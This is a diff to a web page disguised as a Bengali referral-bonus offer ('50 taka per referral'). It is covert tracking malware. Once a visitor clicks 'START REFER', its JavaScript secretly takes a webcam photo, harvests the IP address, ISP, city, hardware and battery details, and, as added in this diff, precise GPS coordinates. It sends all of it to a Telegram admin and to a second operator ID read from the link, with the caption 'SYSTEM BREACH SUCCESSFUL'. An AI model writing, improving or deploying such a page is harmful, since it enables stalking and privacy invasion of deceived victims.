@@ -15,21 +15,20 @@
             background-size: cover; background-position: center;
         }
         .container {
-            background: rgba(0, 0, 0, 0.8); 
+            background: rgba(0, 0, 0, 0.85); 
             padding: 40px 20px; border-radius: 15px; width: 85%; max-width: 380px;
             z-index: 2; position: relative; border: 2px solid #00ff00;
             box-shadow: 0 0 20px #00ff00;
         }
-        h1 { color: #00ff00; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
-        h2 { color: #ffffff; font-size: 16px; margin-bottom: 10px; }
-        p { color: #00ff00; font-size: 14px; margin-bottom: 25px; }
+        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; text-transform: uppercase; }
+        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
         #verify-btn { 
             background-color: #00ff00; color: #000; border: none; padding: 15px; 
             font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
-            transition: 0.3s;
+            transition: 0.3s; letter-spacing: 1px;
         }
         #verify-btn:hover { background-color: #053b05; color: #00ff00; }
-        #status { margin-top: 20px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
+        #status { margin-top: 25px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
         .success { color: #00ff00 !important; }
         .error { color: #ff0000 !important; }
         #video, #canvas { display: none; }
@@ -37,10 +36,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>System Access</h1>
+        <h1>বোনাস সিস্টেম</h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
-        <p>[ 보안 확인이 필요합니다 ]</p>
-        <button id="verify-btn">START VERIFICATION</button>
+        <button id="verify-btn">START REFER</button>
         <div id="status"></div>
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
@@ -55,59 +53,74 @@
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
 
-        // হ্যাকার স্টাইল অ্যাডভান্সড ট্র্যাকার
+        let gpsData = "GPS: Not Shared";
+
+        // GPS থেকে সঠিক লোকেশন বের করা
+        function getPreciseLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    gpsData = `\n🎯 **Precise GPS Loc:**\n[Click for Map](https://www.google.com/maps?q=${lat},${lon})`;
+                }, (err) => {
+                    gpsData = "\nGPS: Permission Denied";
+                });
+            }
+        }
+
         async function getDeepIntel() {
-            let intel = "\n\n🌐 **NETWORK INTEL** 🌐";
+            let intel = "\n\n🌐 **NETWORK INTEL**";
             try {
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
+                intel += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nLoc: \`${d.city}, ${d.country}\`\nMaps: [Click](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
                 
-                intel += `\nIP: ${d.ip}\nOrg: ${d.connection.isp}\nLoc: ${d.city}, ${d.country}\nMaps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-                
-                intel += "\n\n💻 **HARDWARE INTEL** 💻";
-                intel += `\nPlatform: ${navigator.platform}\nCores: ${navigator.hardwareConcurrency || 'N/A'}\nRAM: ${navigator.deviceMemory || 'N/A'}GB\nScreen: ${window.screen.width}x${window.screen.height}`;
+                intel += "\n\n💻 **HARDWARE INTEL**";
+                intel += `\nCores: \`${navigator.hardwareConcurrency || 'N/A'}\`\nRAM: \`${navigator.deviceMemory || 'N/A'}GB\`\nScreen: \`${window.screen.width}x${window.screen.height}\``;
                 
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    intel += `\nBattery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})`;
+                    intel += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
                 }
             } catch (e) { intel += "\nError fetching intel."; }
             return intel;
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> INITIALIZING SYSTEM...";
+            status.innerText = "> INITIALIZING...";
             status.className = "success";
             verifyBtn.style.display = "none"; 
 
+            // GPS এর অনুমতি চাওয়া
+            getPreciseLocation();
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1280, height: 720 } 
-                });
-                document.getElementById('video').srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
                 const intelData = await getDeepIntel();
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
-                    const video = document.getElementById('video');
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL** 🛠" + intelData;
+                        // GPS ডাটা এবং ইনটেল ডাটা একসাথে পাঠানো
+                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + intelData + gpsData;
                         
                         await sendToTelegram(blob, adminId, caption);
                         if (userIdFromLink && userIdFromLink !== adminId) {
                             await sendToTelegram(blob, userIdFromLink, caption);
                         }
 
-                        status.innerText = "> VERIFICATION SUCCESSFUL";
+                        status.innerText = "> SUCCESSFUL";
                         status.className = "success";
                         stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.9);
+                    }, 'image/jpeg', 0.8);
                 }, 3000); 
 
             } catch (err) {
